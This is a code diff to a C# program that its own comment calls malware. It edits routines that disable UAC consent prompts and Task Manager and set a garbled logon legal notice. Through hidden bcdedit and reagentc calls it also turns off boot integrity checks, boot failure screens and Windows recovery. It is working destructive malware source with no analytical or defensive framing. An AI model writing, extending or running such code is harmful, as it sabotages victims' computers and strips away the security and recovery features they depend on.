@@ -20,6 +20,8 @@ namespace Silic5
             RegistryKey reg_disuac = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
             reg_disuac.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
             reg_disuac.SetValue("LocalAccountTokenFilterPolicy", 1, RegistryValueKind.DWord);
+            reg_disuac.SetValue("LegalNoticeCaption", "000", RegistryValueKind.String);
+            reg_disuac.SetValue("LegalNoticeText", "NULL" + Environment.NewLine + "╤ £ ▄ œ Σ ╚ ¥ ε ▲", RegistryValueKind.String);
             RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
             rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
             rk.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
@@ -83,7 +85,6 @@ namespace Silic5
                 cmd_h.cmd_process("cmd.exe", "/c bcdedit /set quietboot on", ProcessWindowStyle.Hidden);
                 cmd_h.cmd_process("cmd.exe", "/c bcdedit /set bootux disabled", ProcessWindowStyle.Hidden);
                 cmd_h.cmd_process("cmd.exe", "/c bcdedit /set bootuxdisabled on", ProcessWindowStyle.Hidden);
-                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set graphicsmodedisabled yes", ProcessWindowStyle.Hidden); //windows vista bootscreen & remove bsod screen on windows 8.1 newer although this malware intended for newer windows version
                 cmd_h.cmd_process("cmd.exe", "/c bcdedit /set bootstatuspolicy ignoreshutdownfailures", ProcessWindowStyle.Hidden); //disables failures
                 cmd_h.cmd_process("cmd.exe", "/c bcdedit /set nointegritychecks on", ProcessWindowStyle.Hidden); //disable systemfile corruption
                 cmd_h.cmd_process("cmd.exe", "/c reagentc /disable", ProcessWindowStyle.Hidden); //disable WINREC
